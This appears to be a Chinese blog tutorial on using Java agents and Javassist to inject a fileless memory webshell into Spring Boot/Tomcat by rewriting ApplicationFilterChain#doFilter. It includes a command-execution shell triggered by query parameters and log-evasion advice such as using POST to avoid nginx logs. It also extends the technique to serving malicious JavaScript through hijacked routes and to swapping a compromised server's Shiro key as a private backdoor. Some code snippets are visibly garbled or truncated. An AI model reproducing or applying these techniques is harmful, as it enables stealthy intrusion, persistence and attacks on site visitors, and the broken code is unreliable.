这个类提供了一些方法，使我们可以便捷的修改方法体：
    public final class CtMethod extends CtBehavior {
        // 主要的内容都在父类 CtBehavior 中
    }
    // 父类 CtBehavior
    public abstract class CtBehavior extends CtMember {
        // 设置方法体
        public void setBody(String src);
        // 插入在方法体最前面
        public void insertBefore(String src);
        // 插入在方法体最后面
        public void insertAfter(String src);
        // 在方法体的某一行插入内容
        public int insertAt(int lineNum, String src);
    }
传递给方法 `insertBefore()` ，`insertAfter()` 和 `insertAt()` 的 String 对象
**是由`Javassist` 的编译器编译的**。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：
符号 | 含义  
---|---  
`$0`, `$1`, `$2`, ... | `$0 = this; $1 = args[1] .....`  
`$args` | 方法参数数组.它的类型为 `Object[]`  
`$$` | 所有实参。例如, `m($$)` 等价于 `m($1,$2,`...`)`  
`$cflow(`...`)` | `cflow` 变量  
`$r` | 返回结果的类型，用于强制类型转换  
`$w` | 包装器类型，用于强制类型转换  
`$_` | 返回值  
详细的内容可以看[Javassist 使用指南（二）](https://www.jianshu.com/p/b9b3ff0e1bf8)。
### 示例
接下来使用一个小示例来更好的说明这个工具的用法。
目标程序 `hello.jar`，使用`Scanner`是为了在注入前不让程序结束：
    // HelloWorld.java
    public class HelloWorld {
        public static void main(String[] args) {
            hello h1 = new hello();
            h1.hello();
            // 输出当前进程的 pid
            System.out.println("pid ==> " + [pid])
            // 产生中断，等待注入
            Scanner sc = new Scanner(System.in);
            sc.nextInt();
            hello h2 = new hello();
            h2.hello();
            System.out.println("ends...");
        }
    }
    // hello.java
    public class hello {
        public void hello() {
            System.out.println("hello world");
        }
    }
Java agent `agent.jar`：
    // AgentDemo.java
    public class AgentDemo {
        public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException {
            Class[] classes = inst.getAllLoadedClasses();
            // 判断类是否已经加载
            for (Class aClass : classes) {      
                if (aClass.getName().equals(TransformerDemo.editClassName)) { 
                    // 添加 Transformer
                    inst.addTransformer(new TransformerDemo(), true);
                    // 触发 Transformer
                    inst.retransformClasses(aClass);
                }
            }
        }
    }
    // TransformerDemo.java
    // 如果在使用过程中找不到javassist包中的类，那么可以使用URLCLassLoader+反射的方式调用
    public class TransformerDemo implements ClassFileTransformer {
        // 只需要修改这里就能修改别的函数
        public static final String editClassName = "com.xxxx.hello.hello";
        public static final String editClassName2 = editClassName.replace('.', '/');
        public static final String editMethod = "hello";
        @Override
        public byte[] transform(...) throws IllegalClassFormatException {
            try {
                ClassPool cp = ClassPool.getDefault();
                if (classBeingRedefined != null) {
                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                    cp.insertClassPath(ccp);
                }
                CtClass ctc = cp.get(editClassName);
                CtMethod method = ctc.getDeclaredMethod(editMethodName);
                String source = "{System.out.println(\"hello transformer\");}";
                method.setBody(source);
                byte[] bytes = ctc.toBytes();
                ctc.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
            return null;
        }
    }
这个示例比较通用，需要更改不同的方法时只需要改变常量和source变量即可。
来看看效果：（输入1之前使用了Java agent）
可以看到的是当第二次调用`com.xxx.hello.hello#hello()`的时候，输出的内容变成了`hello transformer`。
## 内存马
既然现在已经能够修改方法体了，那就可以将木马放到 **某个一定会执行**
的方法内，这样的话，当访问任意路由的时候，就会调用木马。那么现在的问题就变成了，注入到哪一个类的哪个方法比较好。
众所周知，Spring boot 中内嵌了一个`embed Tomcat`作为容器，而在网上流传着很多版本的
Tomcat“无文件”内存马。这些内存马大多数都是通过 **重写/添加`Filter`**来实现的。既然Spring boot
使用了`Tomcat`，那么能不能照葫芦画瓢，通过`Filter`，实现一个Spring boot的内存马呢？当然是可以的。
### Spring Boot的Filter
对于一个WebServer来说，每次请求势必会进过大量的调用，一层一层读源码可不是一个好办法，至少不是一个快方法。这里我选择直接下断点调试。首先写一个Spring
Boot的简单程序：
    @Controller
    public class helloController {
        @RequestMapping("/index")
        public String sayHello() {
            try {
                System.out.println("hello world");
            } catch (Exception e) {
                e.printStackTrace();
            } 
            return "index";
        }
    }
直接在第17行下断点，开启debug，并在网页端访问`http://127.0.0.1:8080/index`，触发断点。此时的调用栈如下图所示（由于太长，只截取一部分）：
在上图中，很明显的可以看到红框中存在很多的`doFilter`和`internalDoFilter`方法，他们大多来自于`ApplicationFilterChain`这个类。
来看看`ApplicationFilterChain`的`doFilter`方法：
    @Override
    public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {
        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                    new java.security.PrivilegedExceptionAction() {
                        @Override
                        public Void run()
                            throws ServletException, IOException {
                            internalDoFilter(req,res);
                            return null;
                        }
                    }
                );
            } catch (PrivilegedActionException pe) {
                ......
            }
        } else {
            internalDoFilter(request,response);
        }
    }
乍一看内容挺多，其实总结下来就是——调用`this.internalDoFilter()`。所以再来简单看一下`internalDoFilter()`方法：
    private void internalDoFilter(ServletRequest request,
                                      ServletResponse response)
            throws IOException, ServletException {
            // Call the next filter if there is one
            if (pos  0) {
                    // 执行命令，获取回显
             }
                response.getWriter().write(result);
                return;
            }
     }
    }
### 注入示例
注入之前，访问`http://127.0.0.1:8080/`：
注入Java agent：
注入后，访问`http://127.0.0.1:8080/?password=xxx&exec=ls -al`：
可以看到已经成功的执行了webshell。
当注入内存shell之后，http的请求流程如下（简化版）：
到这儿，一个简单的Java agent 内存马就制作完成。
### 注意事项
  1. 由于某些中间件（例如nginx）只记录GET请求，使用POST方式发送数据会更加隐蔽。
  2. 由于在Filter层过滤了http请求，访问任意的路由都可以执行恶意代码，为了隐蔽性不建议使用不存在的路由。
  3. agent可以注入多个，但是相同类名的transformer只能注入一个，所以要再次注入别的agent的时候记得更改一下类名。
  4. 这种内存马一旦注入到目标程序中，除了重启没有办法直接卸载掉，因为修改掉了原本的类的字节码。
既然如此，那我再把它改回去不就得了嘛。这就是我为什么选择`doFilter`方法的原因——逻辑简单，方便还原。它的逻辑只是调用了`internalDoFilter()`方法（简单来说）。还原就只需要`setBody()`即可：
        // source.txt
    {
        final javax.servlet.ServletRequest req = $1;
        final javax.servlet.ServletResponse res = $2;
        $0.internalDoFilter(req,res);
    }
## 拓展
当我们能够改变类的字节码，那能做的事情可多了去了，下面我提出两个例子，抛砖引玉。
### 路由劫持
再来假设这么一个情况：拿下来了站点A，同时其他的资产暂时没有更大的收获，需要使用其他方法来扩展攻击面。在A的`/login`中使用了`/static/js/1.js`，那就可以劫持这个路由，回显给他恶意的js代码。
实现的话，只需要在`start.txt`也就是即将插入的代码块中，判断一下当前访问的路由。
    String uri = request.getRequestURI();
    if (uri.equals("/static/js/1.js")) {
        response.getWriter().write([恶意js代码]);
        return;
    }
那么当访问到`/login`的时候，浏览器发现引用了外部js——`/static/js/1.js`，就会去请求它，然而请求被我们修改后的`ApplicationFilterChain#doFilter()`拦截，返回了一个虚假的页面，导致资源被“替换”，恶意代码发挥作用。
### 替换shiro的key
shiro的漏洞已经到了家喻户晓的地步，在实际的渗透中，看到shiro都会使用各种工具扫描一下。而后来shiro采用随机密钥之后，攻击难度就增加了。现在假设有这么一个情况：通过shiro反序列化得到了目标主机的权限，然后偷偷的改掉目标的key，那么这个漏洞就只有你能够攻击，总某种意义上来说，帮人家修复了漏洞，也算是留了后门。
分析shiro反序列化漏洞的文章网上已经有很多了，这里就不再赘述，直接讲重点的地方。
**在解析rememberMe的时候，先将其base64解码，然后使用AES解密，在AES解密的时候，会调用`org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()`**，更改掉这个函数的返回值，就可以更改解密的密钥。实现也很简单，只需要改掉上面的常量和`start.txt`即可：
    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "doFilter";
    // start.txt (使用insertBefore())
    {
        $0.setCipherKey(org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="));
    }
    // start.txt (使用setBody())
    {
        return (org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="));
    }
这里使用`vulhub/CVE-2016-4437`，演示一下效果：
注入前，使用`shiro_tool.jar`检验：
注入`shiroKey.jar`：
注入后，使用`shiro_tool.jar`检验：
可以看到shiro的key被成功更改。
## 参考资料
### Javassist
[Javaassist简介](https://www.jianshu.com/p/334a148b420a)
[Javassist 使用指南（一）](https://www.jianshu.com/p/43424242846b)
[JVM源码分析之javaagent原理完全解读](https://developer.aliyun.com/article/2946)
[javaagent使用指南](https://www.cnblogs.com/rickiyang/p/11368932.html)
[Java Agent基本简介和使用](https://www.jianshu.com/p/de6bde2e30a2)
### 内存马
[利用 intercetor 注入 spring 内存 webshell](https://landgrey.me/blog/19/)
[学Springboot必须要懂的内嵌式Tomcat启动与请求处理](https://www.jianshu.com/p/7dbaac902074)